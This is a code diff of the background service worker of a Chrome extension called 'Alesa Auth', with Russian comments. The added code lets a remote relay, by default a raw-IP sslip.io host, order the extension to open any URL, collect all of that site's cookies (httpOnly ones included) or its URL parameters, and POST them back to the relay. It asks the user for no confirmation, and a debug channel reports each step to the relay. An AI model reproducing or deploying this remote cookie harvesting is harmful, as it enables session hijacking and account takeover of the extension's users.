@@ -1,24 +1,22 @@
 // Alesa Auth — background service worker
-// Хранит pairingToken и relayUrl, обрабатывает сообщения от popup и content scripts.
-// Реализует адаптивный polling:
-//   - Idle: HEAD /poll каждые 3 минуты (chrome.alarms)
-//   - Active: GET /poll каждые 3 секунды (setInterval), макс 2 минуты, затем назад в idle
+// MV3. Adaptive polling + waitForTabLoad pattern (like Behalf ext).
+// Весь open_url flow внутри alarm handler — SW не спит во время capture.
 
 const DEFAULT_RELAY = 'https://136-65-7-197.sslip.io';
 const IDLE_ALARM    = 'alesa-idle-poll';
 const ACTIVE_ALARM  = 'alesa-active-poll';
-const IDLE_PERIOD   = 3;   // минуты idle polling
-const ACTIVE_PERIOD = 1;   // минуты active polling (MV3 minimum = 1 мин, setInterval ненадёжен)
-const ACTIVE_TIMEOUT_MS = 10 * 60 * 1000; // 10 мин — максимальное время active режима
+const IDLE_PERIOD   = 3;   // минуты
+const ACTIVE_PERIOD = 1;   // минуты (MV3 minimum)
+const ACTIVE_TIMEOUT_MS = 10 * 60 * 1000;
 
-// ── State helpers ────────────────────────────────────────────────────────────
+// ── State ────────────────────────────────────────────────────────────────────
 
 async function getState() {
   const data = await chrome.storage.local.get(['pairingToken', 'relayUrl', 'paired']);
   return {
     pairingToken: data.pairingToken || null,
-    relayUrl: data.relayUrl || DEFAULT_RELAY,
-    paired: data.paired || false,
+    relayUrl:     data.relayUrl || DEFAULT_RELAY,
+    paired:       data.paired || false,
   };
 }
 
@@ -26,23 +24,74 @@ async function setState(patch) {
   await chrome.storage.local.set(patch);
 }
 
-// ── Adaptive polling ─────────────────────────────────────────────────────────
-// MV3 Service Workers засыпают через ~30 сек. setInterval ненадёжен.
-// Используем chrome.alarms для обоих режимов:
-//   Idle:   IDLE_ALARM  каждые 3 мин → HEAD /poll
-//   Active: ACTIVE_ALARM каждые 1 мин → GET /poll  (MV3 минимум = 1 мин)
+// ── Debug logging via relay ──────────────────────────────────────────────────
+// Logs to relay /debug endpoint — видно в journalctl без открытого SW console
 
-// Запустить idle polling
+async function debugToRelay(step, detail, state) {
+  const s = state || await getState().catch(() => null);
+  if (!s?.pairingToken) return;
+  console.log(`[alesa] ${step}: ${detail}`);
+  try {
+    await fetch(`${s.relayUrl}/debug`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ pairingToken: s.pairingToken, step, detail: String(detail) }),
+    });
+  } catch {}
+}
+
+// ── Tab loading helper (Behalf pattern) ──────────────────────────────────────
+// Ждёт пока вкладка загрузится на urlPattern.
+// Регистрирует onUpdated listener — Chrome хранит SW живым пока handler не вернулся.
+// Также проверяет сразу (кэшированные страницы могут загрузиться мгновенно).
+
+function waitForTabLoad(tabId, urlPattern, timeoutMs = 5 * 60 * 1000) {
+  return new Promise((resolve, reject) => {
+    let resolved = false;
+
+    const timer = setTimeout(() => {
+      if (resolved) return;
+      resolved = true;
+      chrome.tabs.onUpdated.removeListener(listener);
+      reject(new Error(`Tab load timeout (${Math.round(timeoutMs / 1000)}s)`));
+    }, timeoutMs);
+
+    function listener(id, changeInfo, tab) {
+      if (id !== tabId || changeInfo.status !== 'complete') return;
+      if (urlPattern && !tab.url?.includes(urlPattern)) return;
+      if (resolved) return;
+      resolved = true;
+      clearTimeout(timer);
+      chrome.tabs.onUpdated.removeListener(listener);
+      resolve(tab.url);
+    }
+
+    chrome.tabs.onUpdated.addListener(listener);
+
+    // Immediate check: tab might already be at the right URL (cached load)
+    chrome.tabs.get(tabId).then(tab => {
+      if (resolved) return;
+      if (tab.status === 'complete' && (!urlPattern || tab.url?.includes(urlPattern))) {
+        resolved = true;
+        clearTimeout(timer);
+        chrome.tabs.onUpdated.removeListener(listener);
+        resolve(tab.url);
+      }
+    }).catch(() => {});
+  });
+}
+
+// ── Adaptive polling ─────────────────────────────────────────────────────────
+
 function startIdlePolling() {
   chrome.alarms.clear(ACTIVE_ALARM);
   chrome.storage.local.remove('activePollingStartedAt');
   chrome.alarms.create(IDLE_ALARM, { periodInMinutes: IDLE_PERIOD });
 }
 
-// Переключиться в active режим: poll каждые 1 мин
 async function switchToActivePolling() {
   const existing = await chrome.storage.local.get('activePollingStartedAt');
-  if (existing.activePollingStartedAt) return; // уже активен
+  if (existing.activePollingStartedAt) return;
 
   chrome.alarms.clear(IDLE_ALARM);
   await chrome.storage.local.set({ activePollingStartedAt: Date.now() });
@@ -50,8 +99,6 @@ async function switchToActivePolling() {
   console.log('[alesa] switched to active polling (1 min)');
 }
 
-// Одна итерация poll.
-// headOnly=true: HEAD (только проверка), headOnly=false: GET (забрать команду)
 async function pollOnce(getCommand = false) {
   const state = await getState();
   if (!state.paired || !state.pairingToken) return;
@@ -65,17 +112,14 @@ async function pollOnce(getCommand = false) {
 
     if (method === 'HEAD') {
       if (res.status === 200) {
-        // Есть команда — переключаемся в active.
-        // НЕ делаем pollOnce(true) здесь — ACTIVE_ALARM заберёт команду через 1 мин.
+        // Command waiting — switch to active and GET immediately (don't wait for alarm)
         await switchToActivePolling();
+        await pollOnce(true);
       }
-      // 204 — тишина, остаёмся в idle
       return;
     }
 
-    // GET response
     if (res.status === 204) {
-      // Очередь пуста — возвращаемся в idle
       startIdlePolling();
       return;
     }
@@ -95,12 +139,49 @@ async function executeCommand(command, payload, state) {
   console.log(`[alesa] executing command="${command}"`, payload);
 
   if (command === 'fetch_token') {
-    // Пользователь уже на нужном сайте — показываем кнопку в popup через badge
     const site = payload?.site || '';
     await chrome.storage.local.set({ pendingTokenRequest: { site, description: payload?.description || '' } });
     chrome.action.setBadgeText({ text: '!' });
     chrome.action.setBadgeBackgroundColor({ color: '#2aabee' });
-    // Popup сам проверит pendingTokenRequest и покажет кнопку "Передать токен"
+    return;
+  }
+
+  if (command === 'open_url') {
+    const { url, captureAfterUrl, captureType = 'cookies', label } = payload || {};
+    if (!url) return;
+
+    const captureLabel = label || new URL(url).hostname;
+    await debugToRelay('open_url_start', `url=${url} after=${captureAfterUrl || 'any'} type=${captureType}`, state);
+
+    let tab;
+    try {
+      tab = await chrome.tabs.create({ url, active: true });
+      await debugToRelay('tab_created', `tabId=${tab.id}`, state);
+
+      // Wait for tab to reach captureAfterUrl — entire flow stays in alarm handler chain
+      // Chrome keeps SW alive while this async function is awaited in the alarm handler
+      const finalUrl = await waitForTabLoad(tab.id, captureAfterUrl, 5 * 60 * 1000);
+      await debugToRelay('tab_loaded', `finalUrl=${finalUrl}`, state);
+
+      // Small delay so auth cookies are fully set
+      await new Promise(r => setTimeout(r, 1000));
+
+      await captureAndSend({ tabId: tab.id, tabUrl: finalUrl, captureType, label: captureLabel, state });
+    } catch (e) {
+      await debugToRelay('open_url_error', e.message, state);
+      const s = await getState();
+      if (s.pairingToken) {
+        await fetch(`${s.relayUrl}/save-token`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            pairingToken: s.pairingToken,
+            label: `error:${captureLabel}`,
+            tokenValue: `ERROR: ${e.message}`,
+          }),
+        }).catch(() => {});
+      }
+    }
     return;
   }
 
@@ -113,23 +194,76 @@ async function executeCommand(command, payload, state) {
   console.warn('[alesa] unknown command:', command);
 }
 
+// ── Capture and send ─────────────────────────────────────────────────────────
+
+async function captureAndSend({ tabId, tabUrl, captureType, label, state }) {
+  await debugToRelay('capture_start', `type=${captureType} url=${tabUrl} label=${label}`, state);
+  try {
+    let tokenValue;
+
+    if (captureType === 'url_params') {
+      const u = new URL(tabUrl);
+      const params = {};
+      for (const [k, v] of u.searchParams) params[k] = v;
+      if (!Object.keys(params).length) throw new Error('URL-параметры не найдены');
+      tokenValue = JSON.stringify(params);
+    } else {
+      const cookies = await chrome.cookies.getAll({ url: tabUrl });
+      await debugToRelay('cookies_got', `count=${cookies.length}`, state);
+      if (!cookies.length) throw new Error('Не залогинен — куки не найдены');
+      tokenValue = cookies.map(c => `${c.name}=${c.value}`).join('; ');
+    }
+
+    const res = await fetch(`${state.relayUrl}/save-token`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ pairingToken: state.pairingToken, label, tokenValue }),
+    });
+
+    if (!res.ok) {
+      const j = await res.json().catch(() => ({}));
+      throw new Error(j.error || `relay ${res.status}`);
+    }
+
+    await debugToRelay('capture_ok', `label=${label}`, state);
+    console.log(`[alesa] captured and sent token for "${label}"`);
+    chrome.action.setBadgeText({ text: '✓' });
+    setTimeout(() => chrome.action.setBadgeText({ text: '' }), 3000);
+
+  } catch (e) {
+    console.error('[alesa] captureAndSend error:', e.message);
+    await debugToRelay('capture_error', e.message, state);
+    const s = await getState();
+    if (s.pairingToken) {
+      await fetch(`${s.relayUrl}/save-token`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          pairingToken: s.pairingToken,
+          label: `error:${label}`,
+          tokenValue: `ERROR: ${e.message}`,
+        }),
+      }).catch(() => {});
+    }
+  }
+}
+
 // ── Alarm listener ────────────────────────────────────────────────────────────
 
 chrome.alarms.onAlarm.addListener(async (alarm) => {
   if (alarm.name === IDLE_ALARM) {
-    await pollOnce(false); // HEAD — лёгкая проверка
+    await pollOnce(false);
     return;
   }
 
   if (alarm.name === ACTIVE_ALARM) {
-    // Проверяем таймаут active режима
     const { activePollingStartedAt } = await chrome.storage.local.get('activePollingStartedAt');
     if (!activePollingStartedAt || Date.now() - activePollingStartedAt > ACTIVE_TIMEOUT_MS) {
       console.log('[alesa] active poll timeout — back to idle');
       startIdlePolling();
       return;
     }
-    await pollOnce(true); // GET — забрать команду
+    await pollOnce(true);
   }
 });
 
@@ -153,7 +287,6 @@ chrome.runtime.onMessage.addListener((msg, _sender, sendResponse) => {
 async function handleMessage(msg) {
   const state = await getState();
 
-  // ── pair ──────────────────────────────────────────────────────────────────
   if (msg.type === 'pair') {
     const code = String(msg.code || '').replace(/\s/g, '');
     if (!code || code.length !== 6) throw new Error('Код должен быть 6 цифр');
@@ -168,14 +301,22 @@ async function handleMessage(msg) {
     if (!res.ok) throw new Error(json.error || `relay error ${res.status}`);
 
     await setState({ pairingToken: json.pairingToken, paired: true });
-    startIdlePolling(); // начинаем polling после привязки
+    startIdlePolling();
     return { ok: true };
   }
 
-  // ── sendToken ─────────────────────────────────────────────────────────────
+  if (msg.type === 'getCookies') {
+    const { url } = msg;
+    if (!url) throw new Error('url обязателен');
+    const cookies = await chrome.cookies.getAll({ url });
+    if (!cookies.length) throw new Error('Куки не найдены — возможно, вы не залогинены на этом сайте.');
+    const cookieStr = cookies.map(c => `${c.name}=${c.value}`).join('; ');
+    const httpOnlyCount = cookies.filter(c => c.httpOnly).length;
+    return { cookies: cookieStr, total: cookies.length, httpOnly: httpOnlyCount };
+  }
+
   if (msg.type === 'sendToken') {
     if (!state.paired || !state.pairingToken) throw new Error('Расширение не подключено. Введи код из Telegram.');
-
     const { label, tokenValue } = msg;
     if (!label || !tokenValue) throw new Error('label и tokenValue обязательны');
 
@@ -188,20 +329,41 @@ async function handleMessage(msg) {
     const json = await res.json().catch(() => ({}));
     if (!res.ok) throw new Error(json.error || `relay error ${res.status}`);
 
-    // Очистить badge и pending запрос после успешной передачи
     chrome.action.setBadgeText({ text: '' });
     await chrome.storage.local.remove('pendingTokenRequest');
-    startIdlePolling(); // возвращаемся в idle
+    startIdlePolling();
     return { ok: true };
   }
 
-  // ── getState ──────────────────────────────────────────────────────────────
+  // Capture from popup: opens tab, waits for load, captures cookies
+  // Used by popup quick-capture buttons
+  if (msg.type === 'captureUrl') {
+    if (!state.paired || !state.pairingToken) throw new Error('Расширение не подключено.');
+    const { url, captureAfterUrl, captureType = 'cookies', label } = msg;
+    if (!url) throw new Error('url обязателен');
+
+    const captureLabel = label || new URL(url).hostname;
+    const tab = await chrome.tabs.create({ url, active: true });
+
+    // Kick off capture in background — popup shows status via badge
+    (async () => {
+      try {
+        const finalUrl = await waitForTabLoad(tab.id, captureAfterUrl, 5 * 60 * 1000);
+        await new Promise(r => setTimeout(r, 1000));
+        await captureAndSend({ tabId: tab.id, tabUrl: finalUrl, captureType, label: captureLabel, state });
+      } catch (e) {
+        console.error('[alesa] captureUrl error:', e.message);
+      }
+    })();
+
+    return { ok: true, tabId: tab.id };
+  }
+
   if (msg.type === 'getState') {
     const pending = (await chrome.storage.local.get('pendingTokenRequest')).pendingTokenRequest || null;
     return { ...state, pendingTokenRequest: pending };
   }
 
-  // ── disconnect ────────────────────────────────────────────────────────────
   if (msg.type === 'disconnect') {
     await setState({ pairingToken: null, paired: false });
     chrome.alarms.clear(IDLE_ALARM);
@@ -211,22 +373,12 @@ async function handleMessage(msg) {
     return { ok: true };
   }
 
-  // ── getTabCookies ─────────────────────────────────────────────────────────
-  if (msg.type === 'getTabCookies') {
-    if (!msg.url) throw new Error('url обязателен');
-    const cookies = await chrome.cookies.getAll({ url: msg.url });
-    const cookieStr = cookies.map(c => `${c.name}=${c.value}`).join('; ');
-    return { cookies: cookieStr };
-  }
-
-  // ── setRelayUrl ───────────────────────────────────────────────────────────
   if (msg.type === 'setRelayUrl') {
     if (!msg.url) throw new Error('url обязателен');
     await setState({ relayUrl: msg.url });
     return { ok: true };
   }
 
-  // ── forcePoll (для отладки из popup) ─────────────────────────────────────
   if (msg.type === 'forcePoll') {
     await pollOnce(false);
     return { ok: true };
